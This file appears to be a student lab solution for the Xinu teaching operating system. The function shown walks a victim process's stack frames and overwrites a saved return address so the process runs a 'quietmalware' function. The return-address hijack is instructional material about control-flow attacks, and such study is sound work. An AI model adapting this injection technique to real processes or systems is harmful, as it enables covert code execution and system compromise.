/* attackerB.c - attackerB */

#include <xinu.h>

/*------------------------------------------------------------------------
 *  attackerB  -  Lab 4, Section 4.3. Induces quietmalware code into a healthy process
 *------------------------------------------------------------------------
 */
void attackerB(
	  int		y		/* Integer input to attack specific pid	*/
	)
{
        intmask mask;                   /* Saved interrupt mask         */
    
	void quietmalware(void);	
	pid32	pid;
//	pid32	qmpid; // Quiet Malware pid - never runs

	pid = getpid() - y; // victim pid
	struct procent *prptr;
//	struct procent *qmprptr;

        mask = disable();
        if (isbadpid(pid)) {
                restore(mask);
                return SYSERR;
        }

//	qmpid = create(quietmalware, 8192, 20, "malware", 0);
	prptr = &proctab[pid]; // Process table pointer for victim's process

	int stkframes = 3; // Number of nested function calls while calling sleepms()

	unsigned int * retaddr = prptr->prstkbase; // Search through base pointers to find return address
	unsigned int * prevbaseptr = prptr->prstkbase; // Search through base pointers to find return address
	
	while (stkframes > 0) { // Loop through to find third stack frame return address
		while (*retaddr != prevbaseptr) {
			retaddr = retaddr - 1;
		}
		prevbaseptr = retaddr;
		stkframes = stkframes - 1;
	}

	retaddr = retaddr + 1; // Copy return address one below base pointer

	*(retaddr) = &quietmalware + 3; // Replace return address with function's address

	restore(mask);          /* Restore interrupts */

}
